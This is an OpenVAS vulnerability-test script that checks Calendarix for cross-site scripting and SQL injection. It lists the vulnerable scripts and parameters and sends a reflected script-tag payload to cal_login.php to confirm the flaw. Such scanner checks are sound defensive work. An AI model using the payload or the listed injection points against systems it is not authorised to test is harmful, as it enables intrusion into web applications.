##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_calendarix_xss_n_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Calendarix Cross Site Scripting and SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code and manipulate SQL queries by injecting arbitrary SQL code
  in a user's browser session in the context of an affected site.
  Impact Level: Application.";
tag_affected = "Calendarix version 0.8.20080808";

tag_insight = "The flaws are due to:
  - Improper validation of user supplied input to '/cal_login.php' script.
  - Failure in the '/cal_date.php' script to properly sanitize user-supplied
    input in 'leftfooter' and 'frmname' variables.
  - Improper validation of user supplied input to '/cal_catview.php' via 'gocat'
    variable.
  - Failure in the 'cal_login.php' script to properly sanitize user-supplied
    input via 'login' field when 'password' field is set empty.";
tag_solution = "No solution or patch is available as of 1st June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.calendarix.com/download_advanced.php";
tag_summary = "This host is running Calendarix and is prone to cross site scripting
  and SQL injection vulnerabilities.";

if(description)
{
  script_id(801793);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-02 11:54:09 +0200 (Thu, 02 Jun 2011)");
  script_bugtraq_id(47790);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Calendarix Cross Site Scripting and SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/33876/");
  script_xref(name : "URL" , value : "http://securityreason.com/wlb_show/WLB-2011050051");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101295/calendarix-sqlxss.txt");

  script_description(desc);
  script_summary("Check an exploit string on Calendarix to confirm vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

## Get HTTP Port
calPort = get_http_port(default:80);
if(!get_port_state(calPort)){
  exit(0);
}

foreach path (make_list("/calendarix", "/", cgi_dirs()))
{
  ## Send and recieve the response
  sndReq = http_get(item:string(path, "/calendar.php"), port:calPort);
  rcvRes = http_send_recv(port:calPort, data:sndReq);

  ## Confirm Calendarix application
  if('About Calendarix' >< rcvRes || 'Calendarix version' >< rcvRes)
  {
    ## Try an exploit
    sndReq = http_get(item:string(path, "/cal_login.php/'><script>alert"
                      + "('OpenVAS-XSS-Test');</script>"), port:calPort);
    rcvRes = http_send_recv(port:calPort, data:sndReq);

    ## Check the response to confirm vulnerability
    if("><script>alert('OpenVAS-XSS-Test');</script>" >< rcvRes)
    {
      security_hole(calPort);
      exit(0);
    }
  }
}
